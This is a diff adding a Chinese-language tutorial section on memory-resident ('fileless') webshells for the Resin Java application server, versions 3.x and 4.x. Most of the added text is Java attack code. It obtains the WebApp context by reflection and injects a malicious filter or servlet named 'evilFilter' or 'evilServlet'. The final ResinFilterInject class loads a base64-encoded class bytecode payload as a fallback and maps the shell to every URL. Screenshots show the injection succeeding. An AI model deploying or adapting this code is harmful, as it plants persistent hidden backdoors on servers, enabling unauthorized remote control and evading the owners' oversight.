@@ -4,6 +4,7 @@
 - 0x02-类IIS6.0的解析漏洞
 - 0x03-Resin 4.0.36 信息泄露漏洞(ZSL-2013-5144)
 - 0x04-Resin 回显(已适配 3.x/4.x)
+- 0x05-Resin 内存马(已适配 3.x/4.x)
 
 
 ### 0x01-支持.jspf后缀
@@ -403,6 +404,349 @@ cmd: whoami
 
 ![image-20220105191416860](resinEcho.assets/image-20220105191416860.png)
 
+
+
+### 0x05 Resin 内存马
+
+#### Resin 3.x
+
+> 内存马相关实现、本地测试版本：resin v3.1.16
+
+##### WebApp
+
+> 当前代码运行时上下文环境
+
+配置`web.xml`
+
+```xml
+<servlet>
+    <servlet-name>ServletShell</servlet-name>
+    <servlet-class>com.example.general.ServletShell</servlet-class>
+</servlet>
+<servlet-mapping>
+    <servlet-name>ServletShell</servlet-name>
+    <url-pattern>/index</url-pattern>
+</servlet-mapping>
+```
+
+`com.example.general.ServletShell#doGet`方法处断点，获得相关的调用栈如下
+
+![image-20220106131156977](resin-fileless-shell.assets/image-20220106131156977.png)
+
+逐步分析
+
+- com.caucho.server.dispatch.ServletInvocation
+
+  - 成员方法  getContextRequest()
+
+    ![image-20220106132143479](resin-fileless-shell.assets/image-20220106132143479.png)
+
+    ```
+    Object currentRequest = this.getClass().getMethod("getContextRequest").invoke(null);
+    ```
+
+    ![image-20220106132647928](resin-fileless-shell.assets/image-20220106132647928.png)
+
+    ```
+    currentRequest.getClass() -> com.caucho.server.http.HttpRequest
+    ```
+
+    ![image-20220106132957181](resin-fileless-shell.assets/image-20220106132957181.png)
+
+- com.caucho.server.http.HttpRequest
+
+  - 继承自 com.caucho.server.connection.AbstractHttpRequest
+
+    - 成员方法 getWebApp()
+
+      ![image-20220106142101670](resin-fileless-shell.assets/image-20220106142101670.png)
+
+      ```
+      currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest) -> com.caucho.server.webapp.Application
+      ```
+
+      ![image-20220106142700706](resin-fileless-shell.assets/image-20220106142700706.png)
+
+- com.caucho.server.webapp.Application
+
+  - 继承自 com.caucho.server.webapp.WebApp
+
+    - 向上转换（upcasting），方便调用父类(WebApp)中定义的方法和变量
+
+      ```
+      WebApp webApp = (WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
+      ```
+
+  可成功获取到当前web context(WebApp)。
+
+- com.caucho.server.webapp.WebApp
+
+  - 需要关注的成员方法
+
+    - Filter
+
+    ![image-20220106144849036](resin-fileless-shell.assets/image-20220106144849036.png)
+
+    - Listener
+
+    ![image-20220106144905739](resin-fileless-shell.assets/image-20220106144905739.png)
+
+    - Servlet
+
+    ![image-20220106144931512](resin-fileless-shell.assets/image-20220106144931512.png)
+
+  至此，针对不同类型的内存马调用相关的成员方法注入即可。
+
+
+
+获取WebApp(当前上下文)的代码实现
+
+```java
+ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
+Object currentRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
+WebApp webApp = (WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
+```
+
+运行时截图
+
+![image-20220106150529815](resin-fileless-shell.assets/image-20220106150529815.png)
+
+##### Filter
+
+###### 基于 addFilterMapping
+
+addFilterMapping
+
+- com.caucho.server.webapp.WebApp#addFilterMapping
+
+![image-20220106162933997](resin-fileless-shell.assets/image-20220106162933997.png)
+
+
+
+Filter 示例
+
+![image-20220106172008396](resin-fileless-shell.assets/image-20220106172008396.png)
+
+
+
+Filter 配置
+
+> 常用的方法就是先在web.xml中定义1个 filter demo，然后断点查看相关配置参数
+
+- _filterName
+- _filterClassName
+- _filterClass
+- _urlPattern
+- ...
+
+![image-20220106174307844](resin-fileless-shell.assets/image-20220106174307844.png)
+
+
+
+![image-20220106174411748](resin-fileless-shell.assets/image-20220106174411748.png)
+
+注入思路
+
+- 获取当前环境的WebApp(上下文)
+
+- 构造filterMapping，添加`相关配置`
+
+  ```
+  filterMapping.setFilterClass();
+  filterMapping.setFilterName();
+  FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
+  urlPattern.addText(urlPatternX);
+  urlPattern.init();
+  ```
+
+- 调用成员方法addFilterMapping添加该filterMapping即可
+
+
+
+代码实现
+
+```java
+String filterName = "evilFilter";
+String urlPatternX = "/resin/*";
+ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
+Object currentRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
+WebApp webApp = (WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
+Class evilClazz = classLoader.loadClass("com.example.general.FilterShell");
+FilterMapping filterMapping = new FilterMapping();
+filterMapping.setFilterClass(evilClazz.getName());
+filterMapping.setFilterName(filterName);
+FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
+urlPattern.addText(urlPatternX);
+urlPattern.init();
+webApp.addFilterMapping(filterMapping);
+response.getWriter().write("inject success");
+```
+
+
+
+测试效果
+
+![image-20220106172127259](resin-fileless-shell.assets/image-20220106172127259.png)
+
+
+
+ps: resin下会报异常如下(`有师傅知道为啥嘛，求指点`)
+
+> java.lang.IllegalStateException: sendError() forbidden after buffer has been committed.
+
+##### Servlet
+
+###### 基于 addServletMapping
+
+addServletMapping
+
+- com.caucho.server.webapp.WebApp#addFilterMapping
+
+![image-20220106171354262](resin-fileless-shell.assets/image-20220106171354262.png)
+
+
+
+Servlet 示例
+
+![image-20220106164513466](resin-fileless-shell.assets/image-20220106164513466.png)
+
+
+
+Servlet 配置
+
+> 常用的方法就是先在web.xml中定义1个 servlet demo，断点查看相关配置参数
+
+- _servletName
+- _servletClassName
+- _servletClass
+- ...
+
+![image-20220106173607433](resin-fileless-shell.assets/image-20220106173607433.png)
+
+注入思路
+
+- 获取当前环境的WebApp(上下文)
+
+- 构造servletMapping，添加相关配置
+
+  ```
+  servletMapping.setServletClass();
+  servletMapping.setServletName();
+  servletMapping.addURLPattern();
+  ```
+
+- 调用成员方法addServletMapping添加该servletMapping即可
+
+
+
+代码实现
+
+```java
+String servletName = "evilServlet";
+String urlPatternX = "/resin/*";
+ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+Class<?> servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
+Object servletRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
+WebApp webApp = (WebApp) servletRequest.getClass().getMethod("getWebApp").invoke(servletRequest);
+Class evilClazz = classLoader.loadClass("com.example.general.ServletShell");
+ServletMapping servletMapping = new ServletMapping();
+servletMapping.setServletClass(evilClazz.getName());
+servletMapping.setServletName(servletName);
+servletMapping.addURLPattern(urlPatternX);
+webApp.addServletMapping(servletMapping);
+response.getWriter().write("inject success");
+```
+
+
+
+测试效果
+
+![image-20220106164158028](resin-fileless-shell.assets/image-20220106164158028.png)
+
+
+
+#### Resin 3.x & 4.x
+
+##### Filter
+
+resin 4.x 内存马的相关实现步骤与3.x没有太大的区别，这里直接给出已适配 resin  3.x & 4.x 的Filter型内存马
+
+```java
+/**
+ * Tested version：
+ *      resin3.1.16
+ *      resin4.0.65
+ *
+ */
+public class ResinFilterInject extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        try {
+            String filterName = "evilFilter";
+            String urlPatternX = "/*";
+            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            // com.caucho.server.dispatch.ServletInvocation.getContextRequest
+            Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
+            Object currentRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
+            // com.caucho.server.connection.AbstractHttpRequest.getWebApp
+            WebApp webApp = (WebApp) currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
+            // com.caucho.server.webapp.WebApp._filterManager
+            Field _filterManager = null;
+            try {
+                _filterManager = webApp.getClass().getDeclaredField("_filterManager");
+            }catch (Exception e){
+                _filterManager = webApp.getClass().getSuperclass().getDeclaredField("_filterManager");
+            }
+            _filterManager.setAccessible(true);
+            FilterManager filterManager = (FilterManager) _filterManager.get(webApp);
+            // com.caucho.server.dispatch.FilterManager._filters
+            Field _filtersF = filterManager.getClass().getDeclaredField("_filters");
+            _filtersF.setAccessible(true);
+            Map _filters = null;
+            try{
+                // resin3.1.16: Hashtable<String, FilterConfigImpl> _filters = new Hashtable();
+                _filters  = (Hashtable<String, FilterConfigImpl>) _filtersF.get(filterManager);
+            }catch (Exception e){
+                // resin4.0.65: HashMap<String, FilterConfigImpl> _filters = new HashMap();
+                _filters = (HashMap<String, FilterConfigImpl>) _filtersF.get(filterManager);
+            }
+            // prevent multiple injection
+            if(!_filters.containsKey(filterName)){
+                Class evilClazz = null;
+                try {
+                    evilClazz = classLoader.loadClass("com.example.general.FilterShell");
+                } catch (ClassNotFoundException e) {
+                    BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();
+                    byte[] evilFilterBytes = b64Decoder.decodeBuffer("yv66vg......");
+                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                    defineClass.setAccessible(true);
+                    evilClazz = (Class) defineClass.invoke(classLoader, evilFilterBytes, 0, evilFilterBytes.length);
+                }
+                FilterMapping filterMapping = new FilterMapping();
+                filterMapping.setFilterClass(evilClazz.getName());
+                filterMapping.setFilterName(filterName);
+                FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
+                urlPattern.addText(urlPatternX);
+                urlPattern.init();
+                webApp.addFilterMapping(filterMapping);
+                response.getWriter().write("inject success");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+web.xml
+
+![image-20220106180420193](resin-fileless-shell.assets/image-20220106180420193.png)
+
+测试效果
+
+![image-20220106180350585](resin-fileless-shell.assets/image-20220106180350585.png)
 
 
 
